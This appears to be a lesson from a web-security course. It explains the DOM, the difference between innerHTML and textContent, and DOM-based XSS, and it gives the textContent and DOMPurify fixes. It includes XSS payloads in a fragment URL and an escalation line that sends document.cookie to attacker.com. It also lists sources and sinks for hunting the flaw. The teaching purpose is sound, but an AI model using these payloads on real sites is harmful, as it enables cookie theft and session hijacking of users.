🧠 The DOM & JavaScript as a Weapon

The browser does not just display HTML — it builds a live, programmable tree from it. JavaScript can read, rewrite, and weaponise every node in that tree. Understanding this is the key to understanding every XSS attack.

⏱️ ~20 minutes 📖 Reading + Interactive ⚡ Live demos
🌳 The DOM: The Browser's Live Model of Your Page

When a browser receives an HTML file, it does not just paint it to the screen and forget it. It parses the entire document and builds it into a tree of objects in memory called the Document Object Model (DOM). Every tag becomes a node. Every attribute becomes a property. Every piece of text becomes a text node.

This tree is live — JavaScript can read it, modify it, add to it, and delete from it at any time. That is how modern websites work: buttons update content without reloading the page, forms validate in real time, menus appear and disappear. The DOM is the API between HTML and JavaScript.

It is also, from a security perspective, the battlefield. Every XSS attack is ultimately an attack on the DOM — injecting instructions that the browser's JavaScript engine will execute with the full trust and permissions of the page.

ℹ️ Source vs Sink — the two halves of DOM XSS
In DOM-based XSS, the attack always has two parts: a source (where attacker-controlled data enters the JavaScript environment — e.g. location.hash, document.cookie, a form input value) and a sink (where that data is written into the DOM — e.g. innerHTML, document.write()). The vulnerability exists when data flows from a source to a dangerous sink without sanitization.
⚔️ innerHTML vs textContent — The Most Important Line in Web Security

There is one decision that developers make thousands of times — and one of its two options creates XSS vulnerabilities. The choice is between innerHTML and textContent. They look nearly identical in code. The difference in behaviour is enormous.

🔐 The Rule: Never pass user input to innerHTML
If you must insert HTML dynamically, sanitize it first with a library like DOMPurify: div.innerHTML = DOMPurify.sanitize(userInput). But in the vast majority of cases, textContent is what you actually need — and it is always safe. Choosing innerHTML without sanitization is one of the most common mistakes in modern JavaScript development.
💥 DOM-Based XSS — The Attack That Never Touches the Server

In Module 1 you saw Reflected XSS (payload in the URL, reflected back by the server) and Stored XSS (payload saved and served to all users). DOM-based XSS is different — the server is completely uninvolved. The JavaScript running in the page takes attacker-controlled data and writes it directly into the DOM using a dangerous sink.

This means server-side sanitization cannot stop it — because the server never sees the payload. The server sends a perfectly clean HTML page. The vulnerability lives entirely in the client-side JavaScript.

1

Attacker crafts a URL with payload in the fragment

https://shop.com/search#<img src=x onerror=alert(document.cookie)>
The #fragment is never sent to the server — the browser keeps it locally.

2

Victim clicks the link — browser loads the page normally

Server receives GET /search — no payload visible. Server returns clean HTML. No server-side filter triggers.

3

Client-side JavaScript reads the fragment — the source

const query = location.hash.slice(1); // reads the payload

4

JavaScript writes it to the DOM using innerHTML — the sink

document.getElementById('results').innerHTML = query;
The browser parses the injected HTML. The onerror handler fires. Cookie stolen.

5

The fix — one word

document.getElementById('results').textContent = query;
The payload is rendered as harmless text. No parsing. No execution. Zero XSS.

🔎 How Attackers Find DOM XSS in the Wild

When a professional penetration tester audits a JavaScript-heavy application for DOM XSS, the process is methodical:

StepWhat they doWhat they look for
1 — Map sources Search the JS codebase for places where attacker data enters location.hash, location.search, location.href, document.referrer, document.URL, window.name, postMessage
2 — Map sinks Search for dangerous functions receiving that data innerHTML, outerHTML, document.write, eval, setTimeout, insertAdjacentHTML
3 — Trace the flow Check whether data travels from source to sink without sanitization Any assignment or string concatenation between source and sink
4 — Craft a payload Build a URL or input that places a JavaScript payload at the source #<img src=x onerror=alert(1)> is the standard first test
5 — Escalate Replace alert(1) with fetch('https://attacker.com?c='+document.cookie) Demonstrate actual cookie theft or session hijacking impact
